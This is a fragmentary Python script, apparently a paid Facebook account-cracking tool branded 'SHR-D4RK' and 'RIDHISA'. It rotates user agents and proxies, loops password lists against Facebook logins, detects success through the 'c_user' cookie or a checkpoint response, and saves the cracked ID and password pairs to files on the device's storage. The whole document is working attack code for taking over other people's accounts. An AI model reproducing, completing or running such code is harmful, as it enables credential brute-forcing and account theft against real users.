...
for xd in range(5000):
        ...
        ugen.append(uaku2)
try:
        prox= requests.get('https://github.com/RIDHISA69/.RIDHISA-proxy.txt').text
...
logo=("""
\033[1;94m   _______         _______ 
\033[1;93m  (  ____ |\     /(  ____ )
\033[1;92m  | (    \| )   ( | (    )|
\033[1;91m  | (_____| (___) | (____)|
\033[1;90m  (_____  |  ___  |     __)
\033[1;97m        ) | (   ) | (\ (   
 \033[1;95m /\____) | )   ( | ) \ \__
\033[1;94m  \_______|/     \|/   \__/
\033[91;1m--------------------------------------------------\033[97;1m>>     Owner    : SHR-D4RK🔰
\033[97;1m>>     Facebook : MD Sabbir Hossain Rafi
\033[97;1m>>     Version  : 8.0
\033[97;1m>>     Github  : RIDHISA0078
\033[92;1m>>     Tools Type  : \x1b[91;1m PAID
\033[91;1m--------------------------------------------------""")
def linex():
        print('\033[91;1m--------------------------------------------------')
loop = 0
...
def fia():
                        print(logo)
                        print('\x1b[97;1m>>> D4RK💥  VERSION :\x1b[1;92m 1.1 ')
...
def mmm(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m[RIDHISA] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in SHAHBAZ:
                                print('\r\r\033[1;31m[RIDHISA-CP] %s | %s'%(ids,pas))

                                open('\x1b[91;1m/sdcard/RIDHISA-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in RIDHISA:
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;92m[RIDHISA-OK] '+ids+' | '+pas+'\033[1;97m')

                                        open('/sdcard/RIDHISA-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m[RIDHISA] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in SHAHBAZ:
                                ...
                                print('\r\r\033[1;32m[RIDHISA-OK] %s | %s'%(ids,pas))
                                ...
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m[RIDHISA-CP] '+ids+' | '+pas+'\033[1;97m')

                                        open('/sdcard/RIDHISA-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def fcrack(uid,pwx,tl):
        ...
        try:
                for ps in pwx:
                        session = requests.Session()
                        sys.stdout.write(f'\r [\033[1;97mRIDHISA\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
                        sys.stdout.flush()
                        ua = random.choice(ugen)
    ...
    'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.81 Mobile SFB/15.0.0034.21 Safari/537.36'
                        ...
                        if 'c_user' in log_cookies:
                                ...
                                cid = coki[151:166]
                                print('\33[38;5;208m[RIDHISA-CP] '+uid+' | '+ps+'\033[1;32m')
                                ...
                                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                                cid = coki[141:156]
                                print('\x1b[1;92m[RIDHISA-OK] '+uid+' | '+ps+'\33[0;97m')
